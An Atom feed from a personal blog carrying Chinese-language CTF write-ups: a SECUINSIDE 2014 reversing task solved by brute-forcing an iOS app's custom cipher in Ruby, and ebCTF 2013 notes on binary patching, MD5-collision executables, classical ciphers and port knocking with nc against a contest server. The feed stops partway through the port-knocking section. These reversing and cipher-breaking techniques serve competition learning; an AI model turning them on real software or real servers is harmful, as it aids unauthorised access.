<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeup | blog.dm4.tw]]></title>
  <link href="http://blog.dm4.tw/blog/categories/writeup/atom.xml" rel="self"/>
  <link href="http://blog.dm4.tw/"/>
  <updated>2015-04-20T12:11:03+08:00</updated>
  <id>http://blog.dm4.tw/</id>
  <author>
    <name><![CDATA[dm4]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SECUINSIDE CTF Finals 2014 Writeup - Reversing 100]]></title>
    <link href="http://blog.dm4.tw/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100/"/>
    <updated>2014-07-13T15:54:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100</id>
    <content type="html"><![CDATA[<p>這題在現場沒解完&hellip;因為覺得應該只差一點點，回來之後果然弄出來了啊！</p>

<p>``` text wooyaggo&rsquo;s field <a href="https://ctftime.org/task/1174">https://ctftime.org/task/1174</a>
decrypt it and submit 4th line(without last character 0x0a)</p>

<p>platin text example
1. AAA-111-ASRT-3.1-CC[n]
2. BBB-CCC-ASRT-9.5-DD[n]</p>

<p><a href="http://dl.ctftime.org/144/1174/59a67b2df52c3e0a1330a5952a619462584bba28">http://dl.ctftime.org/144/1174/59a67b2df52c3e0a1330a5952a619462584bba28</a>
<a href="http://dl.ctftime.org/144/1174/enc.txt">http://dl.ctftime.org/144/1174/enc.txt</a>
```</p>

<p>第一個連結載下來之後會發現是一個 zip 檔
<code>text
$ file 59a67b2df52c3e0a1330a5952a619462584bba28
59a67b2df52c3e0a1330a5952a619462584bba28: Zip archive data, at least v1.0 to extract
</code></p>

<p>看了一下內容，會發現是 iOS App 的結構</p>

<p>``` text
$ unzip -l 59a67b2df52c3e0a1330a5952a619462584bba28
Archive:  59a67b2df52c3e0a1330a5952a619462584bba28
  Length     Date   Time    Name</p>

<hr />

<pre><code>    0  07-03-14 13:55   Payload/
    0  07-03-14 13:55   Payload/Inverse.app/
    0  07-03-14 13:55   Payload/Inverse.app/_CodeSignature/
 3074  07-03-14 13:55   Payload/Inverse.app/_CodeSignature/CodeResources
    0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/
    0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/
  258  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/Info.plist
    0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/
  953  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/objects.nib
  953  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/runtime.nib
    0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/
 4276  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/objects.nib
 4454  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/runtime.nib
13944  07-03-14 13:55   Payload/Inverse.app/embedded.mobileprovision
    0  07-03-14 13:55   Payload/Inverse.app/en.lproj/
   42  07-03-14 13:55   Payload/Inverse.app/en.lproj/InfoPlist.strings
 1332  07-03-14 13:55   Payload/Inverse.app/Info.plist
</code></pre>

<p>   210368  07-03-14 13:55   Payload/Inverse.app/Inverse</p>

<pre><code>14929  07-03-14 13:55   Payload/Inverse.app/LaunchImage-568h@2x.png
14929  07-03-14 13:55   Payload/Inverse.app/LaunchImage-700-568h@2x.png
    8  07-03-14 13:55   Payload/Inverse.app/PkgInfo
  150  07-03-14 13:55   Payload/Inverse.app/ResourceRules.plist
</code></pre>

<hr />

<p>   269670                   22 files
```</p>

<p>用 <code>otool</code> 看一下執行檔有沒有被加密</p>

<p>``` text
$ otool -l Payload/Inverse.app/Inverse | grep -A5 LC_ENCRYPTION_INFO</p>

<pre><code>      cmd LC_ENCRYPTION_INFO
  cmdsize 20
cryptoff  16384
cryptsize 16384
cryptid   0
</code></pre>

<h2>Load command 13</h2>

<pre><code>      cmd LC_ENCRYPTION_INFO
  cmdsize 20
cryptoff  16384
cryptsize 16384
cryptid   0
</code></pre>

<h2>Load command 13</h2>

<pre><code>      cmd LC_ENCRYPTION_INFO_64
  cmdsize 24
cryptoff  16384
cryptsize 16384
cryptid   0
    pad   0
</code></pre>

<p>```</p>

<p><code>cryptid</code> 是 0 表示沒有加密，所以我們可以直接來看 <code>Payload/Inverse.app/Inverse</code> ！</p>

<p>看了 code 之後會發現在 <code>[ViewController viewDidLoad]</code> 裡會去讀 <code>/Users/hkpco/tmp/plain.txt</code> ，把檔案的內容當作參數傳給 <code>[ViewController es:]</code> ，在 <code>[ViewController es:]</code> 裡會把 <code>/Users/hkpco/tmp/plain.txt</code> 和 <code>/Users/hkpco/tmp/pass.txt</code> 做一些處理之後，把結果寫到 <code>/Users/hkpco/tmp/enc.txt</code></p>

<p>把整段用 <code>ruby</code> 重寫會長得像</p>

<p>``` ruby
require &lsquo;digest/sha1&rsquo;</p>

<p>def s(i)
  Digest::SHA1.hexdigest i.to_s
end</p>

<p>def h2i(h)
  h.to_i(16)
end</p>

<p>def all(h)
  h.split(&ldquo;&rdquo;).map{ |x| h2i(x) }.reduce(:+)
end</p>

<p>def es(plain, pass)
  enc = &ldquo;&rdquo;
  hash = s(pass)
  sum  = all(hash)
  (0..plain.length &ndash; 1).each do |i|</p>

<pre><code>result = plain[i].ord + h2i(hash[i % 40]) - sum
sum    = all(s(plain[0..i])[0..19]) + all(s(sum)[0..19])
enc   += result.to_s
</code></pre>

<p>  end
  enc
end
```</p>

<p>所以看到目前為止，我們要做的應該是「只知道 <code>enc</code> ，想辦法推回原本的 <code>plain</code> 」，原本的 <code>pass</code> 是什麼對我們來說不重要，我們只要知道 <code>hash = s(pass)</code> 是什麼就好了！</p>

<p>研究了一下會發現，如果要從 <code>enc</code> 逆推 <code>plain</code> 的話，只要暴搜每一輪的 <code>plain[i]</code> 和 <code>hash[i % 40]</code> ， <code>hash[i % 40]</code> 因為是 hex ，只會有 16 種可能，暴完 40 位的 <code>hash</code> 之後，再看 <code>sum</code> 的起始值有沒有滿足 <code>sum == all(hash)</code> 就可以知道結果了。</p>

<p>比較討厭的是題目給的 <code>1. AAA-111-ASRT-3.1-CC[n]</code> ，真的去試的話會發現用 <code>1.</code> 開頭的 plain 是沒有解的，後面接 <code>[n]</code> 也是一樣，所以最後試出來每行的格式應該是像 <code>[0-9A-Z]{3}-[0-9A-Z]{3}-ASRT-\d\.\d-[0-9A-Z]{2}\n</code>&hellip;解這題的時候因為格式也卡了好久&hellip;</p>

<p>``` ruby
enc = [
  -178, -189, -255, -256, -193, -257, -235, -159, -198, -227,
  -187, -187, -267, -221, -225, -228, -235, -249, -259, -287,
  -230, -190, -196, -218, -269, -230, -259, -239, -221, -205,
  -233, -253, -221, -228, -194, -312, -258, -120, -214, -269,
  -255, -186, -215, -258, -252, -229, -234, -289, -215, -229,
  -144, -199, -247, -174, -291, -202, -307, -195, -197, -237,
  -264, -173, -197, -249, -290, -226, -225, -204, -238, -244,
  -201, -152, -270, -244, -263, -155, -253, -229, -247, -319,
  -229, -272, -264, -280, -188, -203, -259, -258, -261, -195,
  -257, -166, -231, -207, -281, -191, -234, -210, -187, -309,
  -170, -172, -239, -225, -195, -238, -265, -260, -291, -185,
  -196, -191, -216, -225, -237, -248, -222, -167, -240, -269,
  -205, -172, -208, -235, -235, -223, -201, -254, -229, -230,
  -209, -265, -312, -240, -201, -274, -258, -180, -223, -250,
]</p>

<p>def dfs(plain, enc)
  round = plain.length
  if round > 39</p>

<pre><code>p plain
return
</code></pre>

<p>  end</p>

<p>  round %= 20
  if round == 3 || round == 7 || round == 12 || round == 16</p>

<pre><code>chars = [ "-" ]
</code></pre>

<p>  elsif round >= 8 &amp;&amp; round &lt;= 11</p>

<pre><code>s = "ASRT"
chars = [ s[round - 8] ]
</code></pre>

<p>  elsif round == 14</p>

<pre><code>chars = [ "." ]
</code></pre>

<p>  elsif round == 13 || round == 15</p>

<pre><code>chars = []
('0'..'9').each { |c| chars.push(c) }
</code></pre>

<p>  elsif round == 19</p>

<pre><code>chars = [ "\n" ]
</code></pre>

<p>  else</p>

<pre><code>chars = []
('0'..'9').each { |c| chars.push(c) }
('A'..'Z').each { |c| chars.push(c) }
</code></pre>

<p>  end
  chars.each do |c|</p>

<pre><code>plain = plain + c
(0..15).each do |i|
  if brute_es(plain, enc, i)
    dfs(plain, enc)
    break
  end
end
plain = plain[0..-2]
</code></pre>

<p>  end
end</p>

<p>dfs(&ldquo;&rdquo;, enc)
```</p>

<p>一共會跑出 34 組，看到 <code>SEC-</code> 和 <code>KOR-</code> 就覺得應該沒解錯，不過直接用 ruby 跑其實有點久，有時間再來看一下怎麼加速 XD</p>

<p>``` text
$ time ruby solve.rb
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J1\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J2\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KD\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KE\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KJ\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KM\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KN\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KO\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L0\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L2\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MR\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MX\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-N5\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NB\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NC\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-ND\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PT\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PY\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q0\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q1\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q2\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q3\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-RX\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SN\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SQ\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SR\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SU\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-T7\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-TE\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UP\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UU\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W0\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W6\n&rdquo;
&ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W8\n&rdquo;</p>

<p>real    92m16.033s
user    92m12.464s
sys     0m3.675s
```</p>

<p>接下來就對這幾組，看他們的 <code>hash</code> 和 <code>sum == all(hash)</code> 了</p>

<p>``` ruby
plains = [
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J1\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-J2\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KD\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KE\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KJ\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KM\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KN\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KO\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L0\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-L2\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MR\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-MX\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-N5\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NB\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-NC\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-ND\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PT\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-PY\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q0\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q1\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q2\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-Q3\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-RX\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SN\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SQ\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SR\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-SU\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-T7\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-TE\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UP\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-UU\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W0\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W6\n&rdquo;,
  &ldquo;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-W8\n&rdquo;,
]</p>

<p>def rev_es(plain, enc, start)
  hash = &ldquo;&rdquo;
  hash += start.to_s(16)</p>

<p>  first_sum = plain[0].ord + start &ndash; enc[0]
  sum = first_sum;
  sum = all(s(plain[0])[0..19]) + all(s(sum)[0..19])</p>

<p>  (1..plain.length &ndash; 1).each do |i|</p>

<pre><code>r   = enc[i] - plain[i].ord + sum
sum = all(s(plain[0..i])[0..19]) + all(s(sum)[0..19])
return 0 if r &lt; 0 || r &gt; 15
hash += r.to_s(16)
</code></pre>

<p>  end</p>

<p>  p hash if all(hash) == first_sum
end</p>

<p>decode_hash(plains, enc)
```</p>

<p>只有兩組符合條件</p>

<p><code>text
$ ruby solve.rb
"011c945f30ce2cbafc452f39840f025693339c42"
"011c945f30ce2cbafc452f39840f025693339909"
</code></p>

<p>接著就直接用這兩組來解 enc ，看看哪個才是正解！</p>

<p>``` ruby
def es_hash(enc, hash)
  output = &ldquo;&rdquo;
  sum  = all(hash)
  (0..enc.length &ndash; 1).each do |i|</p>

<pre><code>c = enc[i] - h2i(hash[i % 40]) + sum
output += c.chr
sum    = all(s(output)[0..19]) + all(s(sum)[0..19])
</code></pre>

<p>  end
  output
end</p>

<p>p es_hash(enc, &ldquo;011c945f30ce2cbafc452f39840f025693339c42&rdquo;)
p es_hash(enc, &ldquo;011c945f30ce2cbafc452f39840f025693339909&rdquo;) # error
```</p>

<p>用第一個 <code>hash</code> 可以成功還原 <code>plain</code></p>

<p><code>text
$ ruby solve.rb
"SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KO\nCOV-718-ASRT-7.9-QE\nCON-C1D-ASRT-1.1-CO\nCOM-ICQ-ASRT-1.9-KR\nLSA-IQ1-ASRT-3.0-KR\nAES-JOO-ASRT-9.9-KR\n"
</code></p>

<p>所以 flag 應該就是第四行的 <code>CON-C1D-ASRT-1.1-CO</code> ！</p>

<p>不過最後正確的 <code>hash</code> 是 <code>011c945f30ce2cbafc452f39840f025693339c42</code> ，其實 <code>pass</code> 就只是 <code>1111</code> 而已&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ebCTF 2013 Writeup]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/"/>
    <updated>2013-11-08T20:56:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup</id>
    <content type="html"><![CDATA[<p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>

<h2>BIN100</h2>

<p>擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。</p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN300</h2>

<p><code>
$ gdb
(gdb) file moon
(gdb) b luaL_loadbuffer
Breakpoint 1 at 0x411110
(gdb) r
Breakpoint 1, 0x0000000000411110 in luaL_loadbuffer ()
(gdb) x/3s $rsi
0x627340 &lt;content.2593&gt;:    "p = 54111037\ng = 56321\n\nio.write(\"Enter your password: \")\nio.flush()\npassword=io.read()\nif string.len(password) ~= 32 then\n    print(\"Wrong!\")\n    return 0\nend\n\nv = g\nalpha = \"0123456789abcdef\"\nfor lo"...
0x627408 &lt;content.2593+200&gt;:    "op =1,32 do\n    v = v * g\n    v = v % p\n    r = v % 16\n    good = string.sub(alpha,r+1,r+1)\n    if good ~= string.sub(password,loop,loop) then\n        print(\"Wrong!\")\n        return 0\n    end\nend\nprin"...
0x6274d0 &lt;content.2593+400&gt;:    "t(\"Well done, the flag is: ebCTF{\"..password..\"}\")\n-- f02233aca4839124ee6ffa766883c47e\n"
</code></p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN400</h2>

<p>題目是要生出 5 個 MD5 一樣的 console executable PE32 ，分別會印出：</p>

<ul>
<li>File1: All Eindbazen are wearing wooden shoes</li>
<li>File2: All Eindbazen live in a windmill</li>
<li>File3: All Eindbazen grow their own tulips</li>
<li>File4: All Eindbazen smoke weed all day</li>
<li>File5: All Eindbazen are cheap bastards</li>
</ul>


<p>所以做 md5 collision ，原本檔案的內容是對自己做簡單的 hash 再從 hash 決定要印哪一句：</p>

<p>```
// by seanwu</p>

<h2>include &lt;stdio.h></h2>

<p>const char* str[5]= {</p>

<pre><code>"All Eindbazen are wearing wooden shoes",
"All Eindbazen live in a windmill",
"All Eindbazen grow their own tulips",
"All Eindbazen smoke weed all day",
"All Eindbazen are cheap bastards"
</code></pre>

<p>};
int main(int argc,char **argv){</p>

<pre><code>FILE* f=fopen(argv[0],"rb");
fseek(f,-20005,SEEK_END);
int x=0;
unsigned char z;
for( int i=0; i&lt;20000; i++ ){
    fread(&amp;z,1,1,f);
    x=(x*33331+z)%5;
}
x=(x+5)%5;
puts(str[x]);
return 0;
</code></pre>

<p>}
```</p>

<h3>Reference</h3>

<ul>
<li><a href="http://www.mscs.dal.ca/~selinger/md5collision/">http://www.mscs.dal.ca/~selinger/md5collision/</a></li>
<li><a href="http://www.woodmann.com/forum/archive/index.php/t-10096.html">http://www.woodmann.com/forum/archive/index.php/t-10096.html</a></li>
</ul>


<h2>CRY100</h2>

<ul>
<li><p>1st PART</p>

<p>  原文在 <a href="http://en.wikipedia.org/wiki/Klomp">http://en.wikipedia.org/wiki/Klomp</a> ，用原文來解對應。</p></li>
<li><p>2nd PART</p>

<p>  用的是 ADFGVX cypher 用的 key 是 &lsquo;CARGO&rsquo; ，可以到 <a href="http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en">http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en</a> 做完之後再找一下對應：</p></li>
</ul>


<p>```
$ echo &lsquo;KZUJJUN06TR3T2T6ABTEAB163A3NREE1JZ6N3QFLIYHMP X7V6C6TUK53TZ653N2UNRB316WE11VZ3UV3AKKZUJJ3RV 6D6SZ6J32S11D353TDVZUN0UK68U2N6V23312T33V646N VE4VA36NJZ6N3NSAB3TQFLIYHMPX78UNRT30ETRKBTEAF QQ8U16J6VEV63KHQ8U164ES1U216W3TLL8U16EJJ13KFI Y8U1613386N3K346NRJETV62VZ321E0B4F4Q7&rsquo; | tr -d &lsquo; &rsquo; | tr KZUJN06TR32ABEQFLIYHMPX7VC54 shipngordefmba0123456789tjvc</p>

<p>shippingorderfrombramb1oemendaa1phone0123456789tojorisverhovenfindbe1oWa11theitemsshippedtoDoShopefS11DeverDthingiso8ifnotfee1freetocontactmeonphonenSmber01234567898indregardsbram1008i1opotatoes508i1ocaS1if1oWer228i1oapp1es1348i1o1ee8onesecondpartofthef1agbc1c09
```</p>

<ul>
<li><p>3rd PART</p>

<p>  <code>base64</code> 之後猜測可能是被 <code>xor</code> 過後的 <code>jpeg</code> ，找出 <code>xor</code> key 之後 flag 在圖片裡。</p></li>
<li><p>4th PART</p>

<p>  切開之後直的看就是了！</p></li>
</ul>


<p>```
$ echo &lsquo;thhneu hpeitr eafnw frleo otata uoghb rfirf ttseo&rsquo; | tr &lsquo; &rsquo; $&lsquo;\n&rsquo;</p>

<p>thhneu
hpeitr
eafnw
frleo
otata
uoghb
rfirf
ttseo
```</p>

<ul>
<li><p>5th PART</p>

<p>  人眼找對應：</p></li>
</ul>


<p>```
$ cat 5.txt | tr &ldquo;[:lower:]&rdquo; &ldquo;[:upper:]&rdquo; | tr SIWZGDRYUOMKQBTJPNFEHLX aistheflgbuprodywmcknxv</p>

<p>a common mistake made by foreigners is that the netherlands legaliAed the use of cannabis and other recreational soft drugs. according the law any use of drugs is still illegal, but there is a tolerancy policy called gedoogbeleid for any soft drugs. this is a set of guidelines telling public prosecutors under which circumstances offenders should not be prosecuted. according to current gedoogbeleid the possession of a maximum amount of five grams cannabis for personal use is not prosecuted. cultivation is treated in a similar way. cultivation of 5 plants or less is usually not prosecuted when they are renounced by the cultivator.  so if you come to the netherlands and want to try some recreational use of soft drugs, beware that it is not legal. the fifth part for the flag is ab1fde
```</p>

<ul>
<li><p>6th PART</p>

<p>  Caesar cipher with shift = 4</p></li>
</ul>


<p>```
$ cat 6.txt | tr &ldquo;[:upper:]&rdquo; &ldquo;[:lower:]&rdquo; | tr abcdefghijklmnopqrstuvwxyz wxyzabcdefghijklmnopqrstuv</p>

<p>the delta works is a series of construction projects in the southwest of the netherlands to protect a large area of land around the rhine-meuse-scheldt delta from the sea. the works consist of dams, sluices, locks, dikes, levees, and storm surge barriers. the aim of the dams, sluices, and storm surge barriers was to shorten the dutch coastline, thus reducing the number of dikes that had to be raised.
along with the zuiderzee works, delta works have been declared one of the seven wonders of the modern world by the american society of civil engineers. the last part of the flag is: one-five-f-three-four-}
```</p>

<h2>CRY200</h2>

<p>聽大大說是要去對一堆 n 去做 gcd ，分解出其中一組質數 p, g ，接著再去暴力試出 e, d</p>

<h3>Reference</h3>

<ul>
<li><a href="http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/">http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/</a></li>
</ul>


<h2>CRY300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://pastebin.com/vsUZW2WF">http://pastebin.com/vsUZW2WF</a></li>
</ul>


<h2>CRY400</h2>

<h2>FOR100</h2>

<p>先 <code>strings</code> 發現</p>

<pre><code>eindbazen@eindbazen:~$ python2 ctf.py ' i hide my '
</code></pre>

<p>感覺就是他了！所以試著 <code>grep ctf.py</code> 沒東西之後，再試了 <code>grep sys.argv</code> 會找到一段 <code>python</code> code</p>

<p>```
import sys
import time
import random
import signal
from Crypto.Cipher import AES
key1 = &ldquo;is this where&rdquo;
key2 = sys.argv[1]
key3 = raw_input(&ldquo;Password: &rdquo;)
iv = &lsquo;a very random iv&rsquo;
secret = &lsquo;./flag&rsquo;
mode = AES.MODE_CBC
def encrypt(signum, frame):</p>

<pre><code>key = key1 + key2 + key3
enc = AES.new(key, mode, iv)
inp = raw_input("Enter secret: ")
diff = len(inp) % 16
if diff != 0:
inp += ' ' * (16 - diff)
with open(secret, 'wb') as outfile:
    outfile.write(enc.encrypt(inp))
del key, enc
</code></pre>

<p>def decrypt(signum, frame):</p>

<pre><code>key = key1 + key2 + key3
enc = AES.new(key, mode, iv)
with open(secret, 'rb') as infile:
    print(enc.decrypt(infile.read(48)))
del key, enc
</code></pre>

<p>signal.signal(signal.SIGUSR1, encrypt)
signal.signal(signal.SIGUSR2, decrypt)
while True:</p>

<pre><code>time.sleep(1)
</code></pre>

<p>```</p>

<p>接著要找 <code>key3</code> ，試著 <code>grep 'i hide my'</code> 之後找到一行</p>

<pre><code>is this where i hide my secrets?
</code></pre>

<p>拿他當 key 跑 AES decrypt 就拿到 flag 了！</p>

<h2>FOR200</h2>

<h3>Reference</h3>

<pre><code>&lt; Guest10733&gt; how did u get sms in for200 ?
&lt;@gijs&gt; Guest10733: the SMS is stored in inbox.txt but in some binary format that is also used to transmit sms over the network
&lt; cr0n&gt; Guest10733: sms pdu: http://www.smartposition.nl/resources/sms_pdu.html
</code></pre>

<h2>FOR300</h2>

<h3>Reference</h3>

<h2>FOR400</h2>

<h2>NET100</h2>

<p>從給的 <code>net-100.pcap</code> 裡可以找到一個有密碼的 <code>rookit.zip</code> ，發現裡面有 flag ，接著就是要找解壓縮密碼了，密碼可以在一連串的 udp packet 中找到！</p>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET200</h2>

<p>這題一開始只給了 <code>112 + 386 + 712 + 1398 + 8771 + 11982 + 15397 + 23984 = 51037</code> ，連到網頁看到了 <code>X-Powered-By:*knock knock*</code> ，猜測是要做 port knocking ！</p>

<p><code>
$ nc -w 1 54.216.81.14 112;
$ nc -w 1 54.216.81.14 386;
$ nc -w 1 54.216.81.14 712;
$ nc -w 1 54.216.81.14 1398;
$ nc -w 1 54.216.81.14 8771;
$ nc -w 1 54.216.81.14 11982;
$ nc -w 1 54.216.81.14 15397;
$ nc -w 1 54.216.81.14 23984;
$ nc -w 1 54.216.81.14 51037;
So you are knocking me, how about I return the favor?
Repeat after me and I will open the last port…
</code></p>

<p>下一階段的提示是要照著對方敲我們 port 的順序敲回去，我們是利用 <code>iptables</code> 來把進來的 tcp connection 記錄下來：</p>

<p>```</p>

